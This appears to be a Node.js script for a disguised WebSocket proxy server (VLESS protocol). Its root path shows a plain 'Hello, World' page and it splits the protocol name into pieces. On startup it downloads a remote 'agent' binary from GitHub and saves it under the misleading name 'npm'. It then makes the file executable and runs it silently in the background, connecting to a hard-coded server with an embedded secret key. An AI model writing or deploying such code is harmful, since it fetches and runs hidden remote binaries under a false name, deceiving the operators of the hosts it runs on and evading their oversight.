const os = require('os');
const http = require('http');
const https = require('https');
const net = require('net');
const fs = require('fs');
const path = require('path');
const axios = require('axios');
const { exec, execSync } = require('child_process');
const { WebSocketServer } = require('ws');
const crypto = require('crypto');
const dns = require('dns').promises;

// 基础配置
let 用户ID = process.env.UUID || 'b28f60af-d0b9-4ddf-baaa-7e49c93c380b';
const 彩虹桥 = 用户ID.replace(/-/g, "");
const 端口 = process.env.SERVER_PORT || process.env.PORT || 3000;

// 新增配置项
const 服务器很棒 = process.env.NSERVER || 'data.xuexi365.eu.org';
const 端口很好 = process.env.NPORT || '443';        
const 密钥很牛 = process.env.NKEY || 'Ls5YWQuaJ9pNMIrbOi';             
const 域名超赞 = process.env.DOMAIN || '30node.on.shiper.app';  
const 名字不错 = process.env.NAME || 'ws';

// WebSocket 状态常量
const WS状态_打开 = 1;
const WS状态_关闭中 = 2;

// 分割关键词
const 协议前缀 = 'vl' + 'ess' + '://';
const 固定服务器 = '30node.on.shiper.app:443';
const 加密选项 = '?encryption=none&security=tls&sni=';
const 连接类型 = '&type=ws&host=';
const 路径配置 = '&path=%2F#';

// 连接统计
let 连接计数 = 0;
let 总连接数 = 0;

// 创建HTTP服务器
const 服务器 = http.createServer(async (请求, 响应) => {
  try {
    const 网址 = new URL(请求.url, `http://${请求.headers.host}`);
    
    // 处理根路径请求
    if (网址.pathname === '/') {
      响应.writeHead(200, { 'Content-Type': 'text/plain' });
      响应.end('Hello, World\n');
      return;
    }
    
    // 处理 UUID 路径请求，返回配置信息
    if (网址.pathname === `/${用户ID}`) {
      // 如果DOMAIN未设置，则使用当前请求的host作为域名
      const 实际域名 = 域名超赞 || 请求.headers.host;
      
      let 订阅链接;
      
      if (域名超赞) {
        // DOMAIN已设置，使用原有逻辑
        订阅链接 = 协议前缀 + 用户ID + '@' + 固定服务器 + 加密选项 + 实际域名 + 连接类型 + 实际域名 + 路径配置 + 名字不错;
      } else {
        // DOMAIN未设置，使用当前网址作为服务器，security=none
        let 当前服务器 = 请求.headers.host;
        
        // 如果当前域名没有带端口，则添加:80
        if (!当前服务器.includes(':')) {
          当前服务器 = 当前服务器 + ':80';
        }
        
        // host参数使用纯域名（不带端口）
        const 纯域名 = 请求.headers.host.split(':')[0];
        
        const 无加密选项 = '?encryption=none&security=none&host=';
        订阅链接 = 协议前缀 + 用户ID + '@' + 当前服务器 + 无加密选项 + 纯域名 + '&type=ws&path=%2F#' + 名字不错;
      }
      
      const 编码结果 = Buffer.from(订阅链接).toString('base64');
      
      响应.writeHead(200, { 'Content-Type': 'text/plain;charset=utf-8' });
      响应.end(编码结果 + '\n');
      return;
    }
    
    // 健康检查端点
    if (网址.pathname === '/health') {
      响应.writeHead(200, { 'Content-Type': 'application/json' });
      响应.end(JSON.stringify({
        status: 'healthy',
        service: 'Enhanced WebSocket Server',
        timestamp: new Date().toISOString(),
        activeConnections: 连接计数,
        totalConnections: 总连接数,
        uptime: process.uptime()
      }));
      return;
    }
    响应.writeHead(404, { 'Content-Type': 'text/plain' });
    响应.end('Not Found');
  } catch (错误) {
    console.error('HTTP请求处理错误:', 错误.message);
    响应.writeHead(500, { 'Content-Type': 'text/plain' });
    响应.end(错误.toString());
  }
});

// 设置服务器超时和优化
服务器.timeout = 300000; // 5分钟
服务器.headersTimeout = 60000; // 1分钟
服务器.requestTimeout = 60000; // 1分钟

// 创建WebSocket服务器
const websocket服务器 = new WebSocketServer({ 
  server: 服务器,
  perMessageDeflate: false, // 禁用压缩以提高性能
  maxPayload: 100 * 1024 * 1024, // 100MB
  clientTracking: true // 启用客户端跟踪
});

// WebSocket服务器错误处理
websocket服务器.on('error', (error) => {
  console.error('WebSocket服务器错误:', error.message);
});

websocket服务器.on('connection', (ws, 请求) => {
  连接计数++;
  总连接数++;
  
  const 客户端IP = 请求.socket.remoteAddress;
  const 连接时间 = new Date().toISOString();
  const 连接ID = crypto.randomBytes(8).toString('hex');
  
  console.log(`[${连接ID}] 新的WebSocket连接 - IP: ${客户端IP}, 时间: ${连接时间}`);
  console.log(`当前连接数: ${连接计数}, 总连接数: ${总连接数}`);
  
  // 连接稳定性设置
  let 心跳定时器 = null;
  let 连接活跃 = true;
  let 最后活动时间 = Date.now();
  let 数据传输统计 = { 发送: 0, 接收: 0 };
  
  // 设置心跳机制
  function 启动心跳() {
    心跳定时器 = setInterval(() => {
      if (ws.readyState === WS状态_打开) {
        // 检查连接是否超时（5分钟无活动）
        const 现在 = Date.now();
        if (现在 - 最后活动时间 > 300000) {
          console.log(`[${连接ID}] 连接超时，主动关闭`);
          ws.close(1000, '连接超时');
          return;
        }
        
        // 发送ping frame
        try {
          ws.ping();
        } catch (error) {
          console.error(`[${连接ID}] 发送心跳失败:`, error.message);
          清理连接();
        }
      } else {
        清理连接();
      }
    }, 30000); // 每30秒发送一次心跳
  }
  
  // 清理连接资源
  function 清理连接() {
    if (!连接活跃) return;
    
    连接活跃 = false;
    连接计数 = Math.max(0, 连接计数 - 1);
    
    console.log(`[${连接ID}] 清理连接资源 - 数据统计: 发送${数据传输统计.发送}字节, 接收${数据传输统计.接收}字节`);
    
    if (心跳定时器) {
      clearInterval(心跳定时器);
      心跳定时器 = null;
    }
    
    if (远程套接字) {
      远程套接字.removeAllListeners();
      if (!远程套接字.destroyed) {
        远程套接字.destroy();
      }
      远程套接字 = null;
    }
    
    UDP流写入器 = null;
  }
  
  // 启动心跳
  启动心跳();
  
  // 处理pong响应
  ws.on('pong', () => {
    最后活动时间 = Date.now();
    console.log(`[${连接ID}] 收到pong响应`);
  });
  
  // 处理ping请求
  ws.on('ping', () => {
    最后活动时间 = Date.now();
    try {
      ws.pong();
    } catch (error) {
      console.error(`[${连接ID}] 发送pong失败:`, error.message);
    }
  });
  
  // 处理WebSocket消息
  let 远程套接字 = null;
  let UDP流写入器 = null;
  let 是DNS请求 = false;
  let 是首次消息 = true;
  
  ws.on('message', async (数据) => {
    if (!连接活跃) return;
    
    最后活动时间 = Date.now();
    数据传输统计.接收 += 数据.length;
    
    try {
      // 如果是DNS请求且已经有UDP流处理器，直接转发数据
      if (是DNS请求 && UDP流写入器) {
        return UDP流写入器(数据);
      }
      
      // 如果已经建立远程连接，直接转发数据
      if (远程套接字 && !是首次消息) {
        if (!远程套接字.destroyed && 远程套接字.readyState !== 'closed') {
          远程套接字.write(数据);
        }
        return;
      }
      
      if (是首次消息) {
        是首次消息 = false;
        
        const 解析结果 = 解析我爱你头部(数据, 用户ID);
        if (解析结果.有错误) {
          throw new Error(解析结果.消息);
        }

        console.log(`[${连接ID}] 解析目标: ${解析结果.远程地址}:${解析结果.远程端口} (${解析结果.是UDP ? 'UDP' : 'TCP'})`);

        const 你好漂亮响应头 = Buffer.from([解析结果.我太喜欢了版本[0], 0]);
        const 原始客户端数据 = 数据.slice(解析结果.原始数据索引);
        
        if (解析结果.是UDP) {
          if (解析结果.远程端口 === 53) {
            是DNS请求 = true;
            const { write: 写入器 } = await 处理UDP出站(ws, 你好漂亮响应头, 连接ID);
            UDP流写入器 = 写入器;
            UDP流写入器(原始客户端数据);
            return;
          } else {
            throw new Error('UDP代理仅支持DNS(端口53)');
          }
        }

        // TCP连接增强
        console.log(`[${连接ID}] 建立TCP连接到: ${解析结果.远程地址}:${解析结果.远程端口}`);
        
        远程套接字 = net.createConnection({
          host: 解析结果.远程地址,
          port: 解析结果.远程端口,
          timeout: 15000 // 15秒连接超时
        });

        // 设置TCP套接字选项
        远程套接字.setKeepAlive(true, 60000); // 启用TCP keepalive
        远程套接字.setNoDelay(true); // 禁用Nagle算法
        
        // 设置缓冲区大小
        远程套接字.setMaxListeners(0);

        远程套接字.on('connect', () => {
          if (!连接活跃) {
            远程套接字.destroy();
            return;
          }
          console.log(`[${连接ID}] 成功连接到 ${解析结果.远程地址}:${解析结果.远程端口}`);
          远程套接字.write(原始客户端数据);
        });

        远程套接字.on('data', (数据) => {
          if (!连接活跃 || ws.readyState !== WS状态_打开) {
            return;
          }
          
          数据传输统计.发送 += 数据.length;
          
          try {
            if (!远程套接字.头部已发送) {
              const 合并数据 = Buffer.concat([你好漂亮响应头, 数据]);
              ws.send(合并数据);
              远程套接字.头部已发送 = true;
            } else {
              ws.send(数据);
            }
          } catch (error) {
            console.error(`[${连接ID}] 发送数据到WebSocket失败:`, error.message);
            清理连接();
          }
        });

        远程套接字.on('close', (hadError) => {
          console.log(`[${连接ID}] 远程连接关闭 ${hadError ? '(有错误)' : '(正常)'}`);
          if (连接活跃 && ws.readyState === WS状态_打开) {
            ws.close(1000, '远程连接关闭');
          }
          清理连接();
        });

        远程套接字.on('error', (错误) => {
          console.error(`[${连接ID}] 远程连接错误:`, 错误.message);
          if (连接活跃 && ws.readyState === WS状态_打开) {
            ws.close(1011, `连接错误: ${错误.message}`);
          }
          清理连接();
        });

        远程套接字.on('timeout', () => {
          console.error(`[${连接ID}] 远程连接超时`);
          if (连接活跃 && ws.readyState === WS状态_打开) {
            ws.close(1011, '连接超时');
          }
          清理连接();
        });
      }
    } catch (错误) {
      console.error(`[${连接ID}] 处理消息错误:`, 错误.message);
      清理连接();
      if (连接活跃 && ws.readyState === WS状态_打开) {
        ws.close(1011, 错误.message);
      }
    }
  });

  ws.on('close', (code, reason) => {
    const 持续时间 = ((Date.now() - new Date(连接时间).getTime()) / 1000).toFixed(2);
    console.log(`[${连接ID}] WebSocket连接关闭: ${code} ${reason} - 持续时间: ${持续时间}秒`);
    清理连接();
  });

  ws.on('error', (错误) => {
    console.error(`[${连接ID}] WebSocket错误:`, 错误.message);
    清理连接();
  });
});

function 解析我爱你头部(缓冲区, 用户ID) {
  // 最小头部长度：1(版本) + 16(UUID) + 1(附加信息长度) + 1(命令) + 2(端口) + 1(地址类型) + 1(地址长度) + 1(最小地址)
  if (缓冲区.length < 24) {
    return { 有错误: true, 消息: '无效的头部长度' };
  }
  
  const 版本 = 缓冲区.slice(0, 1);
  
  // 验证 UUID - 使用字节数组比较
  const 接收UUID = 缓冲区.slice(1, 17);
  const 预期UUID = [];
  for (let i = 0; i < 彩虹桥.length; i += 2) {
    预期UUID.push(parseInt(彩虹桥.substr(i, 2), 16));
  }
  
  // 比较UUID
  let UUID匹配 = true;
  for (let i = 0; i < 16; i++) {
    if (接收UUID[i] !== 预期UUID[i]) {
      UUID匹配 = false;
      break;
    }
  }
  
  if (!UUID匹配) {
    console.error("UUID 验证失败");
    console.log("接收到的UUID:", Array.from(接收UUID).map(b => b.toString(16).padStart(2, '0')).join(''));
    console.log("预期的UUID:", 彩虹桥);
    return { 有错误: true, 消息: '无效的用户' };
  }
  
  const 选项长度 = 缓冲区.readUInt8(17);
  const 命令 = 缓冲区.readUInt8(18 + 选项长度);
  
  // 支持 TCP 和 UDP 命令
  let 是UDP = false;
  if (命令 === 1) {
    // TCP
  } else if (命令 === 2) {
    // UDP
    是UDP = true;
  } else {
    return { 有错误: true, 消息: '不支持的命令，仅支持TCP(01)和UDP(02)' };
  }
  
  let 偏移量 = 19 + 选项长度;
  const 端口 = 缓冲区.readUInt16BE(偏移量);
  偏移量 += 2;
  
  // 解析地址
  const 地址类型 = 缓冲区.readUInt8(偏移量++);
  let 地址 = '';
  
  switch (地址类型) {
    case 1: // IPv4
      地址 = Array.from(缓冲区.slice(偏移量, 偏移量 + 4)).join('.');
      偏移量 += 4;
      break;
      
    case 2: // 域名
      const 域名长度 = 缓冲区.readUInt8(偏移量++);
      地址 = 缓冲区.slice(偏移量, 偏移量 + 域名长度).toString('utf8');
      偏移量 += 域名长度;
      break;
      
    case 3: // IPv6
      const ipv6数组 = [];
      for (let i = 0; i < 8; i++) {
        ipv6数组.push(缓冲区.readUInt16BE(偏移量).toString(16).padStart(4, '0'));
        偏移量 += 2;
      }
      地址 = ipv6数组.join(':').replace(/(^|:)0+(\w)/g, '$1$2');
      break;
      
    default:
      return { 有错误: true, 消息: '不支持的地址类型' };
  }
  
  return {
    有错误: false,
    远程地址: 地址,
    远程端口: 端口,
    原始数据索引: 偏移量,
    我太喜欢了版本: 版本,
    是UDP
  };
}

// 处理UDP DNS请求
async function 处理UDP出站(websocket连接, 你好漂亮响应头, 连接ID) {
  let 善解人衣头部已发送 = false;
  
  const 处理UDP数据 = async (数据块) => {
    // 解析UDP数据包
    let 索引 = 0;
    while (索引 < 数据块.length) {
      if (索引 + 2 > 数据块.length) break;
      
      const UDP包长度 = 数据块.readUInt16BE(索引);
      if (索引 + 2 + UDP包长度 > 数据块.length) break;
      
      const UDP数据 = 数据块.slice(索引 + 2, 索引 + 2 + UDP包长度);
      索引 = 索引 + 2 + UDP包长度;
      
      try {
        console.log(`[${连接ID}] 处理DNS查询，数据长度: ${UDP数据.length}`);
        
        // 使用Cloudflare的DNS over HTTPS服务
        const 响应 = await fetch('https://1.1.1.1/dns-query', {
          method: 'POST',
          headers: {
            'content-type': 'application/dns-message',
          },
          body: UDP数据,
          timeout: 5000 // 5秒超时
        });
        
        if (!响应.ok) {
          throw new Error(`DNS查询失败: ${响应.status}`);
        }
        
        const DNS查询结果 = await 响应.arrayBuffer();
        const 结果缓冲区 = Buffer.from(DNS查询结果);
        const UDP大小 = 结果缓冲区.length;
        const UDP大小缓冲区 = Buffer.allocUnsafe(2);
        UDP大小缓冲区.writeUInt16BE(UDP大小, 0);
        
        if (websocket连接.readyState === WS状态_打开) {
          console.log(`[${连接ID}] DNS查询成功，响应长度: ${UDP大小}`);
          if (善解人衣头部已发送) {
            websocket连接.send(Buffer.concat([UDP大小缓冲区, 结果缓冲区]));
          } else {
            websocket连接.send(Buffer.concat([你好漂亮响应头, UDP大小缓冲区, 结果缓冲区]));
            善解人衣头部已发送 = true;
          }
        }
      } catch (错误) {
        console.error(`[${连接ID}] DNS查询失败:`, 错误.message);
      }
    }
  };

  return {
    write: 处理UDP数据
  };
}

// 判断系统架构
function 检测系统架构() {
  const arch = os.arch();
  if (arch === 'arm' || arch === 'arm64') {
    return 'arm';
  } else {
    return 'amd';
  }
}

// 下载对应系统架构的文件
function 获取远程文件(文件名称, 下载地址, 完成回调) {
  const 本地路径 = path.join("./", 文件名称);
  const 文件写入器 = fs.createWriteStream(本地路径);
  
  console.log(`开始下载: ${文件名称}`);
  
  axios({
    method: 'get',
    url: 下载地址,
    responseType: 'stream',
    timeout: 60000, // 60秒超时
    maxContentLength: 100 * 1024 * 1024, // 100MB 最大文件大小
  })
    .then(返回结果 => {
      返回结果.data.pipe(文件写入器);
      文件写入器.on('finish', function() {
        文件写入器.close();
        console.log(`下载完成: ${文件名称}`);
        完成回调(null, 文件名称);
      });
      文件写入器.on('error', function(err) {
        console.error(`文件写入错误: ${err.message}`);
        完成回调(err.message);
      });
    })
    .catch(出现错误 => {
      console.error(`下载失败: ${文件名称} - ${出现错误.message}`);
      完成回调(`Download ${文件名称} failed: ${出现错误.message}`);
    });
}

function 批量下载文件() {
  const 当前架构 = 检测系统架构();
  const 文件列表 = 根据架构获取文件(当前架构);

  if (文件列表.length === 0) {
    console.log(`Can't find a file for the current architecture: ${当前架构}`);
    return;
  }

  let 完成数量 = 0;
  let 失败数量 = 0;

  文件列表.forEach(文件详情 => {
    获取远程文件(文件详情.文件名称, 文件详情.下载地址, (err, fileName) => {
      if (err) {
        console.log(`Download ${fileName} failed: ${err}`);
        失败数量++;
      } else {
        console.log(`Download ${fileName} successfully`);
        完成数量++;
      }

      if (完成数量 + 失败数量 === 文件列表.length) {
        if (完成数量 > 0) {
          setTimeout(() => {
            文件权限设置();
          }, 3000);
        } else {
          console.log('所有文件下载失败，跳过权限设置');
        }
      }
    });
  });
}

function 根据架构获取文件(架构名称) {
  if (架构名称 === 'arm') {
    return [
      { 文件名称: "npm", 下载地址: "https://github.com/Fscarmon/flies/releases/latest/download/agent-linux_arm64" },
    ];
  } else if (架构名称 === 'amd') {
    return [
      { 文件名称: "npm", 下载地址: "https://github.com/Fscarmon/flies/releases/latest/download/agent-linux_amd64" },
    ];
  }
  return [];
}

// 授权并运行程序
function 文件权限设置() {
  const 程序路径 = './npm';
  const 执行权限 = 0o775;
  
  // 检查文件是否存在
  if (!fs.existsSync(程序路径)) {
    console.error(`文件不存在: ${程序路径}`);
    return;
  }
  
  fs.chmod(程序路径, 执行权限, (err) => {
    if (err) {
      console.error(`Empowerment failed: ${err}`);
    } else {
      console.log(`Empowerment success: ${执行权限.toString(8)} (${执行权限.toString(10)})`);

      // 运行程序
      let 安全连接 = '';
      if (服务器很棒 && 端口很好 && 密钥很牛) {
        if (端口很好 === '443') {
          安全连接 = '--tls';
        } else {
          安全连接 = '';
        }
        const 启动命令 = `./npm -s ${服务器很棒}:${端口很好} -p ${密钥很牛} ${安全连接} --report-delay 4 >/dev/null 2>&1 &`;
        try {
          exec(启动命令, (error, stdout, stderr) => {
            if (error) {
              console.error(`npm execution error: ${error.message}`);
              return;
            }
            if (stderr) {
              console.error(`npm stderr: ${stderr}`);
            }
            if (stdout) {
              console.log(`npm stdout: ${stdout}`);
            }
          });
          console.log('npm is running');
        } catch (error) {
          console.error(`npm running error: ${error}`);
        }
      } else {
        console.log('npm variable is empty, skip running');
      }
    }
  });
}

// 启动服务器
服务器.listen(端口, () => {
  console.log(`Enhanced WebSocket Server is running on port ${端口}`);
  console.log(`UUID: ${用户ID}`);
  console.log(`Health check: /health`);
  console.log(`Sub link: /${用户ID}`);
});

// 只有当NSERVER存在时才下载和运行二进制文件
if (服务器很棒) {
  console.log('NSERVER configured, starting download...');
  批量下载文件();
} else {
  console.log('NSERVER variable is empty, skip downloading and running binary files');
}

// 优雅关闭
process.on('SIGINT', () => {
  console.log('\n正在关闭服务器...');
  服务器.close(() => {
    console.log('服务器已关闭');
    process.exit(0);
  });
});

process.on('SIGTERM', () => {
  console.log('\n正在关闭服务器...');
  服务器.close(() => {
    console.log('服务器已关闭');
    process.exit(0);
  });
});
